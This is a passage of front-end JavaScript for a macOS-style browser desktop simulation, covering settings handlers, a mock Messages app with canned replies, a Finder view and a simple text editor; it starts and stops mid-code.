                const percentage = ((count - 5) / (50 - 5)) * 100;
                e.target.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${percentage}%, #e5e5e7 ${percentage}%, #e5e5e7 100%)`;
            });
            
            const recentPercentage = ((10 - 5) / (50 - 5)) * 100;
            recentItemsCount.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${recentPercentage}%, #e5e5e7 ${recentPercentage}%, #e5e5e7 100%)`;

            windowEl.querySelectorAll('.mac-radio').forEach(radio => {
                radio.addEventListener('change', (e) => {
                    const value = e.target.value;
                    if (value === 'always') {
                        document.body.style.setProperty('--scrollbar-visibility', 'visible');
                    } else if (value === 'never') {
                        document.body.style.setProperty('--scrollbar-visibility', 'hidden');
                    } else {
                        document.body.style.setProperty('--scrollbar-visibility', 'auto');
                    }
                });
            });

            const defaultBrowser = windowEl.querySelector('#default-browser');
            defaultBrowser.addEventListener('change', (e) => {
                console.log('Default browser changed to:', e.target.value);
            });

            const recentApps = windowEl.querySelector('#recent-apps');
            const recentDocuments = windowEl.querySelector('#recent-documents');
            const recentServers = windowEl.querySelector('#recent-servers');
            
            [recentApps, recentDocuments, recentServers].forEach(checkbox => {
                checkbox.addEventListener('change', (e) => {
                    console.log(`${e.target.id}:`, e.target.checked ? 'enabled' : 'disabled');
                });
            });
            
            windowEl.querySelector('.appearance-option[data-theme="light"]').classList.add('selected');
            windowEl.querySelector('.accent-color[data-color="blue"]').classList.add('selected');
            
            function updateSlidersForDarkMode() {
                const sliders = windowEl.querySelectorAll('.mac-slider.ios-style');
                sliders.forEach(slider => {
                    const value = slider.value;
                    const max = slider.max;
                    const min = slider.min;
                    const percentage = ((value - min) / (max - min)) * 100;
                    slider.style.background = `linear-gradient(to right, #0A84FF 0%, #0A84FF ${percentage}%, #424245 ${percentage}%, #424245 100%)`;
                });
            }
            
            function updateSlidersForLightMode() {
                const sliders = windowEl.querySelectorAll('.mac-slider.ios-style');
                sliders.forEach(slider => {
                    const value = slider.value;
                    const max = slider.max;
                    const min = slider.min;
                    const percentage = ((value - min) / (max - min)) * 100;
                    slider.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${percentage}%, #e5e5e7 ${percentage}%, #e5e5e7 100%)`;
                });
            }

            const wallpaperThumbs = windowEl.querySelectorAll('.wallpaper-thumb');
            const wallpaperUploadInput = windowEl.querySelector('#wallpaper-upload');
            wallpaperThumbs.forEach(thumb => {
                thumb.addEventListener('click', () => {
                    document.body.style.backgroundImage = `url('${thumb.src}')`;
                    wallpaperThumbs.forEach(t => t.classList.remove('active'));
                    thumb.classList.add('active');
                });
            });
            wallpaperUploadInput.addEventListener('change', (e) => {
                const file = e.target.files[0];
                if (file) {
                    const reader = new FileReader();
                    reader.onload = (event) => {
                        document.body.style.backgroundImage = `url('${event.target.result}')`;
                        wallpaperThumbs.forEach(t => t.classList.remove('active'));
                    };
                    reader.readAsDataURL(file);
                }
            });

            windowEl.querySelector('#dock-size').addEventListener('input', (e) => {
                document.documentElement.style.setProperty('--dock-item-size', `${e.target.value}px`);
            });
            windowEl.querySelector('#dock-magnification').addEventListener('change', (e) => {
                dock.classList.toggle('magnification-enabled', e.target.checked);
            });

            const systemVolume = windowEl.querySelector('#system-volume');
            const volumeDisplay = windowEl.querySelector('#volume-display');
            const alertVolume = windowEl.querySelector('#alert-volume');
            const alertDisplay = windowEl.querySelector('#alert-display');

            systemVolume.addEventListener('input', (e) => {
                const value = e.target.value;
                volumeDisplay.textContent = `${value}%`;
                
                e.target.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${value}%, #e5e5e7 ${value}%, #e5e5e7 100%)`;
            });

            alertVolume.addEventListener('input', (e) => {
                const value = e.target.value;
                alertDisplay.textContent = `${value}%`;
                
                e.target.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${value}%, #e5e5e7 ${value}%, #e5e5e7 100%)`;
            });
            
            systemVolume.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF 50%, #e5e5e7 50%, #e5e5e7 100%)`;
            alertVolume.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF 30%, #e5e5e7 30%, #e5e5e7 100%)`;

            const zoomEnabled = windowEl.querySelector('#zoom-enabled');
            const highContrast = windowEl.querySelector('#high-contrast');
            const textSize = windowEl.querySelector('#text-size');

            zoomEnabled.addEventListener('change', (e) => {
                if (e.target.checked) {
                    document.body.style.zoom = '1.2';
                } else {
                    document.body.style.zoom = '1';
                }
            });

            highContrast.addEventListener('change', (e) => {
                document.body.classList.toggle('high-contrast', e.target.checked);
            });

            textSize.addEventListener('change', (e) => {
                const sizes = {
                    'small': '0.875rem',
                    'medium': '1rem',
                    'large': '1.125rem',
                    'extra-large': '1.25rem'
                };
                document.body.style.fontSize = sizes[e.target.value];
            });

            const locationServices = windowEl.querySelector('#location-services');
            const cameraAccess = windowEl.querySelector('#camera-access');
            const microphoneAccess = windowEl.querySelector('#microphone-access');

            locationServices.addEventListener('change', (e) => {
                console.log('Location services:', e.target.checked ? 'enabled' : 'disabled');
            });

            cameraAccess.addEventListener('change', (e) => {
                console.log('Camera access:', e.target.checked ? 'enabled' : 'disabled');
            });

            microphoneAccess.addEventListener('change', (e) => {
                console.log('Microphone access:', e.target.checked ? 'enabled' : 'disabled');
            });

            const notificationsEnabled = windowEl.querySelector('#notifications-enabled');
            const notificationSound = windowEl.querySelector('#notification-sound');
            const notificationDuration = windowEl.querySelector('#notification-duration');

            notificationsEnabled.addEventListener('change', (e) => {
                console.log('Notifications:', e.target.checked ? 'enabled' : 'disabled');
            });

            notificationSound.addEventListener('change', (e) => {
                console.log('Notification sound changed to:', e.target.value);
            });

            notificationDuration.addEventListener('change', (e) => {
                console.log('Notification duration changed to:', e.target.value);
            });

            const soundEffects = windowEl.querySelector('#sound-effects');
            soundEffects.addEventListener('change', (e) => {
                console.log('Sound effects:', e.target.checked ? 'enabled' : 'disabled');
            });

            const autoJoinWifi = windowEl.querySelector('#auto-join-wifi');
            autoJoinWifi.addEventListener('change', (e) => {
                console.log('Auto-join WiFi:', e.target.checked ? 'enabled' : 'disabled');
            });
        }
        
        function openMessagesApp() {
            const id = 'messages';
            if (openWindows.has(id)) {
                bringToFront(openWindows.get(id));
                return;
            }
            const content = `
                <div class="messages-app">
                    <div class="messages-sidebar">
                        <div class="messages-header">
                            <h3>Messages</h3>
                            <button class="new-message-btn">+</button>
                        </div>
                        <div class="conversations-list">
                            <div class="conversation-item active">
                                <div class="contact-avatar">👤</div>
                                <div class="conversation-info">
                                    <div class="contact-name">John Doe</div>
                                    <div class="last-message">Hey, how are you?</div>
                                </div>
                            </div>
                            <div class="conversation-item">
                                <div class="contact-avatar">👩</div>
                                <div class="conversation-info">
                                    <div class="contact-name">Jane Smith</div>
                                    <div class="last-message">Meeting at 3 PM?</div>
                                </div>
                            </div>
                            <div class="conversation-item">
                                <div class="contact-avatar">👨</div>
                                <div class="conversation-info">
                                    <div class="contact-name">Mike Johnson</div>
                                    <div class="last-message">Thanks for the help!</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="chat-area">
                        <div class="chat-header">
                            <div class="chat-contact">
                                <div class="contact-avatar">👤</div>
                                <div class="contact-name">John Doe</div>
                            </div>
                        </div>
                        <div class="chat-messages">
                            <div class="message received">
                                <div class="message-content">Hey, how are you?</div>
                                <div class="message-time">2:30 PM</div>
                            </div>
                            <div class="message sent">
                                <div class="message-content">I'm doing great! How about you?</div>
                                <div class="message-time">2:32 PM</div>
                            </div>
                            <div class="message received">
                                <div class="message-content">Pretty good! Are you free for coffee later?</div>
                                <div class="message-time">2:33 PM</div>
                            </div>
                        </div>
                        <div class="chat-input-area">
                            <div class="chat-input-container">
                                <input type="text" class="chat-input" placeholder="iMessage" id="message-input-${id}">
                                <button class="send-btn" id="send-btn-${id}">↑</button>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            const windowEl = createWindow(id, 'Messages', content, {minWidth: '100vw', minHeight: '100vh'});
            
            const messagesStyle = document.createElement('style');
            messagesStyle.textContent = `
                .messages-app {
                    display: flex;
                    height: 100%;
                    background: #f5f5f7;
                    font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
                }
                
                .messages-sidebar {
                    width: 320px;
                    background: #ffffff;
                    border-right: 1px solid #d1d1d6;
                    display: flex;
                    flex-direction: column;
                }
                
                .messages-header {
                    padding: 20px;
                    border-bottom: 1px solid #d1d1d6;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    height: 72px;
                    box-sizing: border-box;
                }
                
                .messages-header h3 {
                    margin: 0;
                    font-size: 18px;
                    font-weight: 600;
                    color: #1d1d1f;
                    font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
                }
                
                .new-message-btn {
                    width: 24px;
                    height: 24px;
                    border-radius: 50%;
                    border: none;
                    background: #007AFF;
                    color: white;
                    font-size: 18px;
                    cursor: pointer;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    transition: all 0.2s ease;
                }
                
                .new-message-btn:hover {
                    background: #0056CC;
                    transform: scale(1.1);
                }
                
                .conversations-list {
                    flex: 1;
                    overflow-y: auto;
                }
                
                .conversation-item {
                    display: flex;
                    align-items: center;
                    padding: 12px 16px;
                    cursor: pointer;
                    transition: background-color 0.2s ease;
                    border-bottom: 1px solid #f0f0f0;
                }
                
                .conversation-item:hover {
                    background-color: #f8f8f8;
                }
                
                .conversation-item.active {
                    background-color: #007AFF;
                    color: white;
                }
                
                .contact-avatar {
                    width: 40px;
                    height: 40px;
                    border-radius: 50%;
                    background: #e5e5e7;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-size: 18px;
                    margin-right: 12px;
                }
                
                .conversation-info {
                    flex: 1;
                }
                
                .contact-name {
                    font-weight: 500;
                    font-size: 14px;
                    margin-bottom: 2px;
                }
                
                .last-message {
                    font-size: 12px;
                    color: #86868b;
                    line-height: 1.3;
                }
                
                .conversation-item.active .last-message {
                    color: rgba(255, 255, 255, 0.8);
                }
                
                .chat-area {
                    flex: 1;
                    display: flex;
                    flex-direction: column;
                    background: #ffffff;
                }
                
                .chat-header {
                    padding: 16px;
                    border-bottom: 1px solid #e5e5e7;
                    display: flex;
                    align-items: center;
                }
                
                .chat-contact {
                    display: flex;
                    align-items: center;
                }
                
                .chat-messages {
                    flex: 1;
                    padding: 16px;
                    overflow-y: auto;
                    display: flex;
                    flex-direction: column;
                    gap: 12px;
                }
                
                .message {
                    display: flex;
                    flex-direction: column;
                    max-width: 70%;
                }
                
                .message.received {
                    align-self: flex-start;
                }
                
                .message.sent {
                    align-self: flex-end;
                }
                
                .message-content {
                    padding: 8px 12px;
                    border-radius: 18px;
                    font-size: 14px;
                    line-height: 1.4;
                    word-wrap: break-word;
                }
                
                .message.received .message-content {
                    background: #e5e5e7;
                    color: #1d1d1f;
                }
                
                .message.sent .message-content {
                    background: #007AFF;
                    color: white;
                }
                
                .message-time {
                    font-size: 11px;
                    color: #86868b;
                    margin-top: 4px;
                    align-self: flex-end;
                }
                
                .chat-input-area {
                    padding: 16px;
                    border-top: 1px solid #e5e5e7;
                }
                
                .chat-input-container {
                    display: flex;
                    align-items: center;
                    gap: 8px;
                    background: #f5f5f7;
                    border-radius: 20px;
                    padding: 8px 16px;
                }
                
                .chat-input {
                    flex: 1;
                    border: none;
                    background: transparent;
                    outline: none;
                    font-size: 14px;
                    color: #1d1d1f;
                }
                
                .chat-input::placeholder {
                    color: #86868b;
                }
                
                .send-btn {
                    width: 28px;
                    height: 28px;
                    border-radius: 50%;
                    border: none;
                    background: #007AFF;
                    color: white;
                    cursor: pointer;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    font-size: 14px;
                    transition: all 0.2s ease;
                }
                
                .send-btn:hover {
                    background: #0056CC;
                    transform: scale(1.1);
                }
                
                .send-btn:disabled {
                    background: #d1d1d6;
                    cursor: not-allowed;
                    transform: none;
                }
            `;
            document.head.appendChild(messagesStyle);
            
            const messageInput = windowEl.querySelector(`#message-input-${id}`);
            const sendBtn = windowEl.querySelector(`#send-btn-${id}`);
            const chatMessages = windowEl.querySelector('.chat-messages');
            
            function sendMessage() {
                const message = messageInput.value.trim();
                if (!message) return;
                
                const messageElement = document.createElement('div');
                messageElement.className = 'message sent';
                messageElement.innerHTML = `
                    <div class="message-content">${message}</div>
                    <div class="message-time">${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</div>
                `;
                
                chatMessages.appendChild(messageElement);
                chatMessages.scrollTop = chatMessages.scrollHeight;
                messageInput.value = '';
                
                setTimeout(() => {
                    const replies = [
                        "That's great!",
                        "I see what you mean.",
                        "Thanks for letting me know!",
                        "Sounds good to me!",
                        "I'll get back to you soon.",
                        "Perfect!",
                        "Got it!"
                    ];
                    const randomReply = replies[Math.floor(Math.random() * replies.length)];
                    
                    const replyElement = document.createElement('div');
                    replyElement.className = 'message received';
                    replyElement.innerHTML = `
                        <div class="message-content">${randomReply}</div>
                        <div class="message-time">${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</div>
                    `;
                    
                    chatMessages.appendChild(replyElement);
                    chatMessages.scrollTop = chatMessages.scrollHeight;
                }, 2000);
            }
            
            sendBtn.addEventListener('click', sendMessage);
            messageInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    sendMessage();
                }
            });
            
            messageInput.addEventListener('input', () => {
                sendBtn.disabled = !messageInput.value.trim();
            });
        }
        
        function openFinder() {
            const id = 'finder';
            if (openWindows.has(id)) {
                bringToFront(openWindows.get(id));
                return;
            }
            
            const content = `
                <div class="finder-app">
                    <div class="finder-toolbar">
                        <div class="toolbar-buttons">
                            <button class="toolbar-btn" title="Back">←</button>
                            <button class="toolbar-btn" title="Forward">→</button>
                            <button class="toolbar-btn" title="Up">↑</button>
                        </div>
                        <div class="path-bar">
                            <span class="path-text">Macintosh HD > ABOELFADLs > ABOELFADL > Desktop</span>
                        </div>
                        <div class="view-buttons">
                            <button class="view-btn active" title="Icon View">⊞</button>
                            <button class="view-btn" title="List View">☰</button>
                            <button class="view-btn" title="Column View">☰</button>
                        </div>
                    </div>
                    <div class="finder-sidebar">
                        <div class="sidebar-section">
                            <div class="sidebar-header">Favorites</div>
                            <div class="sidebar-item active">
                                <span class="sidebar-icon">🏠</span>
                                <span>Home</span>
                            </div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">📁</span>
                                <span>Desktop</span>
                            </div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">📄</span>
                                <span>Documents</span>
                            </div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">⬇️</span>
                                <span>Downloads</span>
                            </div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">🎵</span>
                                <span>Music</span>
                            </div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">🖼️</span>
                                <span>Pictures</span>
                            </div>
                        </div>
                        <div class="sidebar-section">
                            <div class="sidebar-header">Devices</div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">💾</span>
                                <span>Macintosh HD</span>
                            </div>
                            <div class="sidebar-item">
                                <span class="sidebar-icon">📱</span>
                                <span>iPhone</span>
                            </div>
                        </div>
                    </div>
                    <div class="finder-content">
                        <div class="content-header">
                            <div class="header-title">Desktop</div>
                            <div class="header-count">8 items</div>
                        </div>
                        <div class="files-grid" id="files-grid-${id}">
                            <div class="file-item" data-type="folder">
                                <div class="file-icon">📁</div>
                                <div class="file-name">Applications</div>
                            </div>
                            <div class="file-item" data-type="folder">
                                <div class="file-icon">📁</div>
                                <div class="file-name">Documents</div>
                            </div>
                            <div class="file-item" data-type="folder">
                                <div class="file-icon">📁</div>
                                <div class="file-name">Downloads</div>
                            </div>
                            <div class="file-item" data-type="folder">
                                <div class="file-icon">📁</div>
                                <div class="file-name">Music</div>
                            </div>
                            <div class="file-item" data-type="folder">
                                <div class="file-icon">📁</div>
                                <div class="file-name">Pictures</div>
                            </div>
                            <div class="file-item" data-type="file">
                                <div class="file-icon">📄</div>
                                <div class="file-name">readme.txt</div>
                            </div>
                            <div class="file-item" data-type="file">
                                <div class="file-icon">🖼️</div>
                                <div class="file-name">screenshot.png</div>
                            </div>
                            <div class="file-item" data-type="file">
                                <div class="file-icon">📊</div>
                                <div class="file-name">report.pdf</div>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            
            const windowEl = createWindow(id, 'Finder', content, {minWidth: '100vw', minHeight: '100vh'});
            
            const finderStyle = document.createElement('style');
            finderStyle.textContent = `
                                 .finder-app {
                     display: flex;
                     flex-direction: column;
                     height: 100%;
                     background: #ffffff;
                     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                 }
                
                                 .finder-toolbar {
                     display: flex;
                     align-items: center;
                     padding: 12px 16px;
                     border-bottom: 1px solid #d1d1d6;
                     background: #f5f5f7;
                     gap: 12px;
                     height: 44px;
                     box-sizing: border-box;
                 }
                
                .toolbar-buttons {
                    display: flex;
                    gap: 4px;
                }
                
                                 .toolbar-btn {
                     width: 32px;
                     height: 32px;
                     border: 1px solid #d1d1d6;
                     background: #ffffff;
                     border-radius: 6px;
                     cursor: pointer;
                     font-size: 16px;
                     transition: all 0.15s ease;
                     display: flex;
                     align-items: center;
                     justify-content: center;
                     font-weight: 500;
                 }
                
                .toolbar-btn:hover {
                    background: #f0f0f0;
                    border-color: #007AFF;
                }
                
                                 .path-bar {
                     flex: 1;
                     background: #ffffff;
                     border: 1px solid #d1d1d6;
                     border-radius: 8px;
                     padding: 8px 16px;
                     font-size: 13px;
                     color: #1d1d1f;
                     font-weight: 400;
                     min-height: 32px;
                     display: flex;
                     align-items: center;
                 }
                
                .view-buttons {
                    display: flex;
                    gap: 4px;
                }
                
                .view-btn {
                    width: 28px;
                    height: 28px;
                    border: 1px solid #d1d1d6;
                    background: #ffffff;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 14px;
                    transition: all 0.2s ease;
                }
                
                .view-btn.active {
                    background: #007AFF;
                    color: white;
                    border-color: #007AFF;
                }
                
                .view-btn:hover:not(.active) {
                    background: #f0f0f0;
                    border-color: #007AFF;
                }
                
                                 .finder-sidebar {
                     width: 220px;
                     background: #f5f5f7;
                     border-right: 1px solid #d1d1d6;
                     overflow-y: auto;
                     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                 }
                
                .sidebar-section {
                    margin-bottom: 16px;
                }
                
                .sidebar-header {
                    padding: 8px 16px;
                    font-size: 12px;
                    font-weight: 600;
                    color: #86868b;
                    text-transform: uppercase;
                    letter-spacing: 0.5px;
                }
                
                                 .sidebar-item {
                     display: flex;
                     align-items: center;
                     padding: 10px 16px;
                     cursor: pointer;
                     font-size: 13px;
                     color: #1d1d1f;
                     transition: all 0.15s ease;
                     border-radius: 6px;
                     margin: 2px 8px;
                     font-weight: 400;
                 }
                
                .sidebar-item:hover {
                    background-color: rgba(0, 122, 255, 0.1);
                }
                
                                 .sidebar-item.active {
                     background-color: #007AFF;
                     color: white;
                     font-weight: 500;
                 }
                
                .sidebar-icon {
                    margin-right: 8px;
                    font-size: 16px;
                }
                
                .finder-content {
                    flex: 1;
                    display: flex;
                    flex-direction: column;
                    background: #ffffff;
                }
                
                                 .content-header {
                     display: flex;
                     justify-content: space-between;
                     align-items: center;
                     padding: 16px 20px;
                     border-bottom: 1px solid #d1d1d6;
                     background: #f5f5f7;
                     height: 52px;
                     box-sizing: border-box;
                 }
                
                .header-title {
                    font-size: 14px;
                    font-weight: 600;
                    color: #1d1d1f;
                }
                
                .header-count {
                    font-size: 12px;
                    color: #86868b;
                }
                
                                 .files-grid {
                     flex: 1;
                     padding: 20px;
                     display: grid;
                     grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
                     gap: 20px;
                     overflow-y: auto;
                     background: #ffffff;
                 }
                
                                 .file-item {
                     display: flex;
                     flex-direction: column;
                     align-items: center;
                     padding: 16px 12px;
                     border-radius: 12px;
                     cursor: pointer;
                     transition: all 0.15s ease;
                     text-align: center;
                     border: 2px solid transparent;
                 }
                
                                 .file-item:hover {
                     background-color: rgba(0, 122, 255, 0.08);
                     border-color: rgba(0, 122, 255, 0.2);
                 }
                
                                 .file-item.selected {
                     background-color: #007AFF;
                     color: white;
                     border-color: #007AFF;
                     box-shadow: 0 2px 8px rgba(0, 122, 255, 0.3);
                 }
                
                .file-icon {
                    font-size: 48px;
                    margin-bottom: 8px;
                }
                
                .file-name {
                    font-size: 12px;
                    line-height: 1.3;
                    word-wrap: break-word;
                    max-width: 100px;
                }
                
                .file-item[data-type="folder"] .file-icon {
                    color: #007AFF;
                }
                
                .file-item[data-type="file"] .file-icon {
                    color: #86868b;
                }
                
                .file-item.selected .file-icon {
                    color: white;
                }
            `;
            document.head.appendChild(finderStyle);
            
            const fileItems = windowEl.querySelectorAll('.file-item');
            const sidebarItems = windowEl.querySelectorAll('.sidebar-item');
            
            fileItems.forEach(item => {
                item.addEventListener('click', (e) => {
                    if (e.ctrlKey || e.metaKey) {
                        item.classList.toggle('selected');
                    } else {
                        fileItems.forEach(file => file.classList.remove('selected'));
                        item.classList.add('selected');
                    }
                });
                
                item.addEventListener('dblclick', () => {
                    const fileName = item.querySelector('.file-name').textContent;
                    const fileType = item.dataset.type;
                    
                    if (fileType === 'folder') {
                        console.log(`Opening folder: ${fileName}`);
                    } else {
                        console.log(`Opening file: ${fileName}`);
                    }
                });
            });
            
            sidebarItems.forEach(item => {
                item.addEventListener('click', () => {
                    sidebarItems.forEach(side => side.classList.remove('active'));
                    item.classList.add('active');
                    
                    const location = item.querySelector('span:last-child').textContent;
                    const pathBar = windowEl.querySelector('.path-text');
                    const headerTitle = windowEl.querySelector('.header-title');
                    
                    pathBar.textContent = `Macintosh HD > ABOELFADLs > ABOELFADL > ${location}`;
                    headerTitle.textContent = location;
                });
                         });
         }
         
         function openTextEditor() {
             const id = 'text-editor';
             if (openWindows.has(id)) {
                 bringToFront(openWindows.get(id));
                 return;
             }
             
             const content = `
                 <div class="text-editor-app">
                     <div class="editor-toolbar">
                         <div class="toolbar-group">
                             <button class="toolbar-btn" title="New File" onclick="newFile('${id}')">📄</button>
                             <button class="toolbar-btn" title="Open File" onclick="openFile('${id}')">📂</button>
                             <button class="toolbar-btn" title="Save File" onclick="saveFile('${id}')">💾</button>
                         </div>
                         <div class="toolbar-separator"></div>
                         <div class="toolbar-group">
                             <button class="toolbar-btn" title="Undo" onclick="undo('${id}')">↶</button>
                             <button class="toolbar-btn" title="Redo" onclick="redo('${id}')">↷</button>
                         </div>
                         <div class="toolbar-separator"></div>
                         <div class="toolbar-group">
                             <button class="toolbar-btn" title="Find" onclick="findText('${id}')">🔍</button>
                             <button class="toolbar-btn" title="Replace" onclick="replaceText('${id}')">🔄</button>
                         </div>
                         <div class="toolbar-separator"></div>
                         <div class="toolbar-group">
                             <select class="font-select" onchange="changeFont('${id}', this.value)">
                                 <option value="monospace">Monospace</option>
                                 <option value="Arial">Arial</option>
                                 <option value="Times New Roman">Times New Roman</option>
                                 <option value="Courier New">Courier New</option>
                             </select>
                             <select class="font-size-select" onchange="changeFontSize('${id}', this.value)">
                                 <option value="12">12</option>
                                 <option value="14" selected>14</option>
                                 <option value="16">16</option>
                                 <option value="18">18</option>
                                 <option value="20">20</option>
                             </select>
                         </div>
                     </div>
                     <div class="editor-statusbar">
                         <span class="status-item">Line: <span id="line-count-${id}">1</span></span>
                         <span class="status-item">Column: <span id="col-count-${id}">1</span></span>
                         <span class="status-item">Words: <span id="word-count-${id}">0</span></span>
                         <span class="status-item">Characters: <span id="char-count-${id}">0</span></span>
                     </div>
                     <div class="editor-content">
                         <textarea id="editor-textarea-${id}" class="editor-textarea" placeholder="Start typing your code or text here...">// Welcome to Text Editor
// This is a simple text editor with syntax highlighting

function helloWorld() {
    console.log("Hello, World!");
    return "Welcome to our macOS-like system!";
}

// You can write code, notes, or any text here
// The editor supports basic features like:
// - File operations (New, Open, Save)
// - Find and Replace
// - Font customization
// - Word and character counting

helloWorld();</textarea>
                     </div>
                 </div>
             `;
             
             const windowEl = createWindow(id, 'Text Editor', content, {minWidth: '100vw', minHeight: '100vh'});
             
             const editorStyle = document.createElement('style');
             editorStyle.textContent = `
                 .text-editor-app {
                     display: flex;
                     flex-direction: column;
                     height: 100%;
                     background: #1e1e1e;
                     color: #d4d4d4;
                     font-family: -apple-system, BlinkMacSystemFont, 'SF Mono', Monaco, 'Cascadia Code', monospace;
                 }
                 
                 .editor-toolbar {
                     display: flex;
                     align-items: center;
                     padding: 12px 16px;
                     background: #2d2d30;
                     border-bottom: 1px solid #3e3e42;
                     gap: 12px;
                     height: 48px;
                     box-sizing: border-box;
                 }
                 
                 .toolbar-group {
                     display: flex;
                     gap: 4px;
                 }
                 
                 .toolbar-btn {
                     width: 36px;
                     height: 36px;
                     border: 1px solid #3e3e42;
                     background: #3c3c3c;
                     color: #d4d4d4;
                     border-radius: 6px;
                     cursor: pointer;
                     font-size: 16px;
                     transition: all 0.15s ease;
                     display: flex;
                     align-items: center;
                     justify-content: center;
                     font-weight: 500;
                 }
                 
                 .toolbar-btn:hover {
                     background: #4c4c4c;
                     border-color: #007AFF;
                 }
                 
                 .toolbar-separator {
                     width: 1px;
                     height: 24px;
                     background: #3e3e42;
                     margin: 0 4px;
                 }
                 
                 .font-select, .font-size-select {
                     padding: 4px 8px;
                     background: #3c3c3c;
                     border: 1px solid #3e3e42;
                     color: #d4d4d4;
                     border-radius: 4px;
                     font-size: 12px;
                 }
                 
                 .editor-statusbar {
                     display: flex;
                     gap: 20px;
                     padding: 8px 16px;
                     background: #007acc;
                     color: white;
                     font-size: 12px;
                     border-bottom: 1px solid #3e3e42;
                     height: 32px;
                     box-sizing: border-box;
                     align-items: center;
                 }
                 
                 .status-item {
                     display: flex;
                     align-items: center;
                     gap: 4px;
                 }
                 
                 .editor-content {
                     flex: 1;
                     position: relative;
                 }
                 
                 .editor-textarea {
                     width: 100%;
                     height: 100%;
                     background: #1e1e1e;
                     color: #d4d4d4;
                     border: none;
                     outline: none;
                     font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', Consolas, 'Courier New', monospace;
                     font-size: 14px;
                     line-height: 1.6;
                     padding: 20px;
                     resize: none;
                     tab-size: 4;
                     font-weight: 400;
                 }
                 
                 .editor-textarea::placeholder {
                     color: #6a6a6a;
                 }
             `;
             document.head.appendChild(editorStyle);
             
             const textarea = windowEl.querySelector(`#editor-textarea-${id}`);
             
             function updateStats() {
                 const text = textarea.value;
                 const lines = text.split('\n');
                 const words = text.trim() ? text.trim().split(/\s+/).length : 0;
                 const chars = text.length;
                 
                 windowEl.querySelector(`#line-count-${id}`).textContent = lines.length;
                 windowEl.querySelector(`#word-count-${id}`).textContent = words;
                 windowEl.querySelector(`#char-count-${id}`).textContent = chars;
                 
                 const cursorPos = textarea.selectionStart;
                 const textBeforeCursor = text.substring(0, cursorPos);
                 const linesBeforeCursor = textBeforeCursor.split('\n');
                 const currentLine = linesBeforeCursor.length;
                 const currentCol = linesBeforeCursor[linesBeforeCursor.length - 1].length + 1;
                 
                 windowEl.querySelector(`#col-count-${id}`).textContent = currentCol;
             }
             
             textarea.addEventListener('input', updateStats);
             textarea.addEventListener('click', updateStats);
             textarea.addEventListener('keyup', updateStats);
             
             updateStats();
             
             window.newFile = function(editorId) {
                 if (confirm('Create new file? Unsaved changes will be lost.')) {
                     document.querySelector(`#editor-textarea-${editorId}`).value = '';
                     updateStats();
                 }
             };
             
             window.openFile = function(editorId) {
                 const input = document.createElement('input');
                 input.type = 'file';
                 input.accept = '.txt,.js,.html,.css,.py,.json';
                 input.onchange = function(e) {
                     const file = e.target.files[0];
                     if (file) {
                         const reader = new FileReader();
                         reader.onload = function(e) {
                             document.querySelector(`#editor-textarea-${editorId}`).value = e.target.result;
                             updateStats();
                         };
                         reader.readAsText(file);
                     }
                 };
                 input.click();
             };
             
             window.saveFile = function(editorId) {
                 const text = document.querySelector(`#editor-textarea-${editorId}`).value;
                 const blob = new Blob([text], { type: 'text/plain' });
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
                 a.download = 'document.txt';
                 a.click();
                 URL.revokeObjectURL(url);
             };
             
             window.undo = function(editorId) {
                 document.querySelector(`#editor-textarea-${editorId}`).focus();
                 document.execCommand('undo');
             };
             
             window.redo = function(editorId) {
                 document.querySelector(`#editor-textarea-${editorId}`).focus();
                 document.execCommand('redo');
             };
             
             window.findText = function(editorId) {
                 const searchTerm = prompt('Find text:');
                 if (searchTerm) {
                     const textarea = document.querySelector(`#editor-textarea-${editorId}`);
                     const text = textarea.value;
                     const index = text.indexOf(searchTerm);
                     if (index !== -1) {
                         textarea.focus();
                         textarea.setSelectionRange(index, index + searchTerm.length);
                     } else {
                         alert('Text not found');
                     }
                 }
             };
             
             window.replaceText = function(editorId) {
                 const findTerm = prompt('Find:');
                 if (findTerm) {
                     const replaceTerm = prompt('Replace with:');
                     if (replaceTerm !== null) {
                         const textarea = document.querySelector(`#editor-textarea-${editorId}`);
                         const text = textarea.value;
                         const newText = text.replace(new RegExp(findTerm, 'g'), replaceTerm);
                         textarea.value = newText;
                         updateStats();
                     }
                 }
             };
             
             window.changeFont = function(editorId, font) {
                 document.querySelector(`#editor-textarea-${editorId}`).style.fontFamily = font;
             };
             
             window.changeFontSize = function(editorId, size) {
                 document.querySelector(`#editor-textarea-${editorId}`).style.fontSize = size + 'px';
             };
         }
         
         function openCalculator() {
             const id = 'calculator';
             if (openWindows.has(id)) {
                 bringToFront(openWindows.get(id));
                 return;
             }
             
             const content = `
                 <div class="calculator-app">
                     <div class="calculator-display">
                         <div class="display-history" id="calc-history-${id}"></div>
